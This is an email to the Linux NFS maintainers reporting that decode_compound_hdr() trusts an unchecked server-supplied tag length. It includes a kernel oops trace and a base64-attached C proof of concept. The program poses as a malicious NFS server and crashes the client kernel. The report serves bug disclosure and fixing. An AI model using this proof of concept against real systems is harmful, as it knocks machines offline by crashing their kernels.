Return-Path: <linux-nfs-owner@vger.kernel.org>
X-Original-To: lists+linux-nfs@lfdr.de
Delivered-To: lists+linux-nfs@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 94BDC445B1B
	for <lists+linux-nfs@lfdr.de>; Thu,  4 Nov 2021 21:30:20 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231849AbhKDUc5 (ORCPT <rfc822;lists+linux-nfs@lfdr.de>);
        Thu, 4 Nov 2021 16:32:57 -0400
Received: from outgoing-stata.csail.mit.edu ([128.30.2.210]:54786 "EHLO
        outgoing-stata.csail.mit.edu" rhost-flags-OK-OK-OK-OK)
        by vger.kernel.org with ESMTP id S231484AbhKDUc5 (ORCPT
        <rfc822;linux-nfs@vger.kernel.org>); Thu, 4 Nov 2021 16:32:57 -0400
X-Greylist: delayed 1176 seconds by postgrey-1.27 at vger.kernel.org; Thu, 04 Nov 2021 16:32:56 EDT
Received: from c-24-60-30-97.hsd1.ma.comcast.net ([24.60.30.97] helo=crash.local)
        by outgoing-stata.csail.mit.edu with esmtpsa (TLS1.2:DHE_RSA_AES_256_CBC_SHA256:256)
        (Exim 4.82)
        (envelope-from <rtm@csail.mit.edu>)
        id 1mij4J-000Orl-HV; Thu, 04 Nov 2021 16:10:39 -0400
Received: from crash.local (localhost [127.0.0.1])
        by crash.local (Postfix) with ESMTP id DBC2911E7E9AC;
        Thu,  4 Nov 2021 16:10:38 -0400 (EDT)
To:     Trond Myklebust <trond.myklebust@hammerspace.com>,
        Anna Schumaker <anna.schumaker@netapp.com>
cc:     linux-nfs@vger.kernel.org
From:   rtm@csail.mit.edu
Reply-To: rtm@csail.mit.edu
Subject: NFS client RPC bug
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=-=-="
Date:   Thu, 04 Nov 2021 16:10:38 -0400
Message-ID: <7517.1636056638@crash.local>
Precedence: bulk
List-ID: <linux-nfs.vger.kernel.org>
X-Mailing-List: linux-nfs@vger.kernel.org

--=-=-=
Content-Type: text/plain

decode_compound_hdr() in fs/nfs/nfs4xdr.c adds the taglen supplied by
the server to a pointer and then dereferences it, but does not first
check taglen for sanity:

        p = xdr_inline_decode(xdr, 8);
        ...;
        hdr->taglen = be32_to_cpup(p);
        ...;
        p = xdr_inline_decode(xdr, hdr->taglen + 4);
        ...;
        p += XDR_QUADLEN(hdr->taglen);
        hdr->nops = be32_to_cpup(p);

The second xdr_inline_decode() limits the opportunities for an
attacker-controlled pointer dereference, but a taglen of 0xfffffffc
will cause a kernel page fault.

I've attached a program that tickles the bug on my kernel 5.15
machine:

# uname -a
Linux (none) 5.15.0-rc7-dirty #15 SMP Thu Nov 4 19:20:36 UTC 2021 riscv64 riscv64 riscv64 GNU/Linux
# cc nfs_1.c
# ./a.out
mount:mount.nfs: timeout set for Thu Jan  1 00:02:12 1970
mount.nfs: trying text-based options 'vers=4.2,addr=127.0.0.1,clientaddr=127.0.0.1'
accept returned 4
proc 0
proc 1
exception pc=0xffffffff8022dcd8 cause=d symbolic tval=0xffffffe102c5aad8
[   16.101267] Unable to handle kernel paging request at virtual address ffffffe102c5aad8
[   16.112762] Oops [#1]
[   16.116973] Modules linked in:
[   16.122429] CPU: 0 PID: 60 Comm: mount.nfs Not tainted 5.15.0-rc7-dirty #13
[   16.131634] Hardware name: ucbbar,riscvemu-bare (DT)
[   16.138694] epc : decode_compound_hdr+0x96/0x12e
[   16.146706]  ra : decode_compound_hdr+0x82/0x12e
[   16.154151] epc : ffffffff8022dcd8 ra : ffffffff8022dcc4 sp : ffffffd00057b6e0
...
[   16.272291] status: 0000000200000121 badaddr: ffffffe102c5aad8 cause: 000000000000000d
[   16.282369] [<ffffffff8022dcd8>] decode_compound_hdr+0x96/0x12e
[   16.290699] [<ffffffff80239c2a>] nfs4_xdr_dec_exchange_id+0x32/0x57e
[   16.299265] [<ffffffff8071af5c>] rpcauth_unwrap_resp_decode+0x12/0x1a
[   16.307926] [<ffffffff8071bc18>] rpcauth_unwrap_resp+0x12/0x1a
[   16.316196] [<ffffffff80711fb4>] call_decode+0x112/0x176
[   16.323488] [<ffffffff8071a498>] __rpc_execute+0x76/0x216
[   16.330751] [<ffffffff8071aab6>] rpc_execute+0x58/0x7e
[   16.337966] [<ffffffff80713340>] rpc_run_task+0x12c/0x16c
[   16.345113] [<ffffffff80224eba>] nfs4_run_exchange_id+0x1d8/0x262
[   16.353364] [<ffffffff80224f68>] _nfs4_proc_exchange_id+0x24/0x2ba
[   16.361556] [<ffffffff8022cfc4>] nfs4_proc_exchange_id+0x30/0x50
[   16.369829] [<ffffffff8023ea28>] nfs41_discover_server_trunking+0x1c/0xa8
[   16.378421] [<ffffffff80240d4e>] nfs4_discover_server_trunking+0x7c/0x1e8
[   16.386958] [<ffffffff802490fe>] nfs4_init_client+0x92/0xf6
[   16.394014] [<ffffffff80205412>] nfs_get_client+0x36a/0x394
[   16.401147] [<ffffffff8024882e>] nfs4_set_client+0xd6/0x13e
[   16.410346] [<ffffffff8024981a>] nfs4_create_server+0xb8/0x208
[   16.421493] [<ffffffff80241606>] nfs4_try_get_tree+0x16/0x4c
[   16.432759] [<ffffffff80218bac>] nfs_get_tree+0x34a/0x3ac
[   16.442283] [<ffffffff8012bce4>] vfs_get_tree+0x18/0x88
[   16.451889] [<ffffffff8014a28e>] path_mount+0x4f4/0x77a
[   16.461619] [<ffffffff8014a560>] do_mount+0x4c/0x7e
[   16.470833] [<ffffffff8014a912>] sys_mount+0xca/0x14e
[   16.480401] [<ffffffff80003046>] ret_from_syscall+0x0/0x2


--=-=-=
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=nfs_1.c
Content-Transfer-Encoding: base64

I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5o
PgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxz
eXMvaW9jdGwuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPHN5cy93YWl0Lmg+
CiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4KCnVuc2lnbmVkIGxvbmcgbG9uZyBhYWFbXSA9IHsK
MHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAow
eDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4
MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDMwMDAwMDAwMDAwMDAwMHVs
bCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxs
LAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGws
CjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwK
MHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAow
eDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4
MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgw
dWxsLAoweDB1bGwsCn07CmludCBpaWkgPSAwOwoKaW50IHJlYWRuKGludCBmZCwgY2hhciAqYnVm
LCBpbnQgbikgewogIGludCBvcmlnID0gbjsKICB3aGlsZShuID4gMCl7CiAgICBpbnQgY2MgPSBy
ZWFkKGZkLCBidWYsIG4pOwogICAgaWYoY2MgPD0gMCkgeyBwZXJyb3IoInJlYWQiKTsgcmV0dXJu
IC0xOyB9CiAgICBuIC09IGNjOwogICAgYnVmICs9IGNjOwogIH0KICByZXR1cm4gb3JpZzsKfQoK
aW50Cm1haW4oKXsKICBzdHJ1Y3QgcmxpbWl0IHI7CiAgci5ybGltX2N1ciA9IHIucmxpbV9tYXgg
PSAwOwogIHNldHJsaW1pdChSTElNSVRfQ09SRSwgJnIpOwoKICBpbnQgcyA9IHNvY2tldChBRl9J
TkVULCBTT0NLX1NUUkVBTSwgMCk7CiAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsKICBtZW1zZXQo
JnNpbiwgMCwgc2l6ZW9mKHNpbikpOwogIHNpbi5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKICBzaW4u
c2luX3BvcnQgPSBodG9ucygyMDQ5KTsKICBpZihiaW5kKHMsIChzdHJ1Y3Qgc29ja2FkZHIgKikm
c2luLCBzaXplb2Yoc2luKSkgPCAwKXsKICAgIHBlcnJvcigiYmluZCIpOyBleGl0KDEpOwogIH0K
ICBsaXN0ZW4ocywgMTApOwogIHN5bmMoKTsgc2xlZXAoMSk7IHNsZWVwKDEpOyBzbGVlcCgxKTsK
CiAgaWYoZm9yaygpID09IDApewogICAgaWYoc3lzdGVtKCJlY2hvIC1uIG1vdW50OiA7IG1vdW50
IC12IC10IG5mcyAxMjcuMC4wLjE6L3RtcCAvbW50IikgPT0gMCl7CiAgICAgIHN5c3RlbSgiZWNo
byAtbiBsczogOyBscyAtbCAvbW50Ly4gL21udC96Iik7CiAgICAgIHN5c3RlbSgiZWNobyAtbiBl
Y2hvOiA7IGVjaG8gaGkgPiAvbW50L3giKTsKICAgICAgc3lzdGVtKCJlY2hvIC1uIHVtb3VudDog
OyB1bW91bnQgL21udCIpOwogICAgfQogICAgZXhpdCgwKTsKICB9CgogIGlmKGZvcmsoKSA9PSAw
KXsKI2RlZmluZSBOQUEgNjQKICAgIHVuc2lnbmVkIGxvbmcgbG9uZyBhYVtOQUFdOwogICAgZm9y
KGludCBpID0gMDsgaSA8IE5BQTsgaSsrKSBhYVtpXSA9IGFhYVtpaWkrK107CiAgICBpbnQgaWkg
PSAwOwoKICAgIHNvY2tsZW5fdCBzaW5sZW4gPSBzaXplb2Yoc2luKTsKICAgIGludCBzMSA9IGFj
Y2VwdChzLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4sICZzaW5sZW4pOwogICAgcHJpbnRmKCJh
Y2NlcHQgcmV0dXJuZWQgJWRcbiIsIHMxKTsKICAgIGlmKHMxIDwgMCkgeyBwZXJyb3IoImFjY2Vw
dCIpOyBleGl0KDEpOyB9CiAgICBjbG9zZShzKTsKICAKICAgIHdoaWxlKDEpewogICAgICB1bnNp
Z25lZCBpbnQgaWxlbjsKICAgICAgaWYocmVhZG4oczEsIChjaGFyKikmaWxlbiwgNCkgPCAwKSBi
cmVhazsKICAgICAgaWxlbiA9IG50b2hsKGlsZW4pOwogICAgICBpbGVuICY9IDB4N2ZmZmZmZmY7
CiAgICAgIGNoYXIgaWJ1ZlsxMDI0XTsKICAgICAgaWYocmVhZG4oczEsIChjaGFyKilpYnVmLCBp
bGVuKSA8IDApIGJyZWFrOwogICAgICBpbnQgeGlkID0gKihpbnQqKShpYnVmKzApOwogICAgICBp
bnQgcHJvYyA9IG50b2hsKCooaW50KikoaWJ1ZisyMCkpOwogICAgICBwcmludGYoInByb2MgJWRc
biIsIHByb2MpOwogICAgICAKICAgICAgY2hhciBvYnVmWzEyOF07CiAgICAgIGludCBvbGVuID0g
c2l6ZW9mKG9idWYpOwogICAgICBpbnQgZHVtbXkgPSBodG9ubChvbGVuIHwgMHg4MDAwMDAwMCk7
CiAgICAgIHdyaXRlKHMxLCAmZHVtbXksIDQpOwogICAgICBtZW1zZXQob2J1ZiwgMHhmZiwgc2l6
ZW9mKG9idWYpKTsKICAgICAgZm9yKGludCBpID0gMDsgaSs4IDw9IHNpemVvZihvYnVmKSAmJiBp
aSA8IE5BQTsgaSArPSA4KQogICAgICAgICoodW5zaWduZWQgbG9uZyBsb25nICopKG9idWYgKyBp
KSBePSBhYVtpaSsrXTsKICAgICAgKihpbnQqKShvYnVmKzApID0geGlkOwogICAgICAqKGludCop
KG9idWYrNCkgPSBodG9ubCgxKTsgLy8gUkVQTFkKICAgICAgKihpbnQqKShvYnVmKzgpID0gaHRv
bmwoMCk7IC8vIE1TR19BQ0NFUFRFRAogICAgICAqKGludCopKG9idWYrMTIpID0gaHRvbmwoMCk7
IC8vIG9wYXF1ZV9hdXRoIGZsYXZvciA9IEFVVEhfTlVMTAogICAgICAqKGludCopKG9idWYrMTYp
ID0gaHRvbmwoMCk7IC8vIG9wYXF1ZV9hdXRoIGxlbmd0aAogICAgICAqKGludCopKG9idWYrMjAp
ID0gaHRvbmwoMCk7IC8vIFNVQ0NFU1MKICAgICAgaWYod3JpdGUoczEsIG9idWYsIG9sZW4pPD0w
KSBwZXJyb3IoIndyaXRlIik7CiAgICB9CiAgICBleGl0KDEpOwogIH0KICBjbG9zZShzKTsKICBz
bGVlcCg3KTsKfQo=
--=-=-=--
